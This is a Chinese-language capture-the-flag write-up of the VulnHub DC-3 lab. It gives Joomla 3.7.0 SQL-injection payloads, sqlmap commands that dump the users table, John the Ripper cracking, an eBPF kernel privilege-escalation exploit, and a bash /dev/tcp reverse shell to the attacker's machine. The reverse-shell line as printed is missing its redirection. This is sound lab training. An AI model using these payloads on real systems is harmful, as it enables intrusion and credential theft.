# DC-3靶场日记

靶场地址：https://www.vulnhub.com/entry/dc-32,312/

参考文章：DC靶机1-9合集 - Lmg66 - 博客园

# 寻找靶机IP并探测端口

sudo arp-scan -l

对比MAC地址可以找到IP为192.168.152.131

探测靶机开放端口：

nmap -sV -p- 192.168.152.131

发现开放了80端口

# 信息搜集

访问192.168.152.131查看一下网页信息

通过Wappalyzer发现CMS系统是Joomla，并且还看到了一串提示：

This time, there is only one flag, one entry point and no clues.

To get the flag, you'll obviously have to gain root privileges.

How you get to be root is up to you - and, obviously, the system.

Good luck - and I hope you enjoy this little challenge.  :-)

在Kali里面安装一个joomscan，这是一个Joomla扫描仪，它帮助网络开发人员和网站管理员帮助确定已部署的Joomla网站可能存在的安全漏洞，也可以使用CMSseek进一步扫描

# 安装joomscan并探测
apt-get install joomscan
joomscan --url http://192.168.152.131

# 安装CMSseek并扫描
git clone https://github.com/Tuhinshubhra/CMSeek
cd /home/kali/CMSeek
python3 cmseek.py --url 192.168.152.131

两个工具一样的，都可以扫描发现Joomla版本和其他目录

# 搜索joomla漏洞

searchsploit joomla 3.7.0

查看漏洞详情：

cat /usr/share/exploitdb/exploits/php/webapps/42033.txt

发现是SQL Injection，原理为com_fields组件对请求数据没有进行过滤，从而导致SQL注入

还记得工具metasploit查找漏洞吗（提一下）：

我们还发现文件中列了一个URL Vulerable：

http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

大概是poc，修改一下尝试攻击：

http://192.168.152.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),1)

可以看到在最后的XPATH报错里面成功输出了数据库名joomladb

# 获取所有数据库名
updatexml(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),40,31)),1)

information_schema,joomladb,mysql,performance_schema,sys

# 获取当前数据库表名
updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)

#__assets,#__associations,#__banner_clients......

# 获取当前数据库所有列名
updatexml(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema=database()),1,31)),1)

id,parent_id,lft,rgt,level,name,title,rules,id,context,key,id,name,conjtact,email,extrainfo

像这样限制字符长度输出表名列名未免太麻烦了

# sqlmap注入

# 爆库名
sqlmap -u 'http://192.168.152.131/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=id' -p 'list[fullordering]' --batch --dbs

-p:只检测指定参数
--batch:自动采用默认选项，减少交互
--dbs：在确认存在注入之后枚举数据库名称

# 查表名
sqlmap -u "http://192.168.152.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),1)" -D "joomladb" --tables
或者
sqlmap -u 'http://192.168.152.131/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=id' -p 'list[fullordering]' --batch -D "joomladb" --tables

-D:指定数据库为joomladb

# 爆字段名
sqlmap -u 'http://192.168.152.131/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=id' -p 'list[fullordering]' -D "joomladb" -T "#__users" --columns
或者
sqlmap -u "http://192.168.152.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),1)" -D "joomladb" -T "#__users" --columns

# 爆数据
sqlmap -u 'http://192.168.152.131/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=id' -p 'list[fullordering]' -D "joomladb" -T "#__users" -C name,password --dump
或者
sqlmap -u "http://192.168.152.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),1)" -D "joomladb" -T "#__users" -C name,password --dump

# 破解密码

Join the Ripper("JtR")：开源密码破解工具，通常是对获取到的密码哈希值进行离线破解，John会尝试不同的候选密码，计算它们的哈希值并进行比较，如果匹配就找到了对应的明文密码，常见的破解方式包括：字典攻击、暴力破解、规则攻击、增量模式

# 创建哈希文件hash.txt
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > hash.txt
# 爆破密码
john hash.txt
john hash.txt --show

注意这里在echo的时候只能用单引号而不是双引号，原因是不会让字符串里的$转义，例如echo "$SHELL"的结果并不是$SHELL，而是SHELL变量的值

# Linux内核提权

之前倒是也写过Linux提权相关的文章，到这里的知识就补充到那篇文章里面，参考文章来自Yuy0ung师傅：Linux提权-内核提权 - Yuy0ung - 博客园

# 信息搜集

# 查看系统全部信息
uname -a

# 查看Linux系统的版本信息
cat /etc/issue

# 查找EXP

# 寻找内核提权脚本
searchsploit Ubuntu 16.04

# 将EXP移动到当前目录
searchsploit -m linux/local/39772.txt

# 查看EXP
cat /home/kali/39772.txt

得到EXP的地址：

https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip

在蚁剑中我们下载然后解压并上传exploit.tar到靶机目录

tar -xf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh

这里看到没有显示编译错误，而是两条警告，接下来我们需要准备反弹shell，在kali上执行./doubleput：

kali端执行：

nc -l -p 4444

蚁剑上执行：

bash -c 'bash -i /dev/tcp/192.168.152.128/4444 0>&1'

跳转目录到ebpf_mapfd_doubleput_exploit之后执行./doubleput，等待一会发现成功提权

最后找到flag在root目录下：

cat /root/the-flag.txt
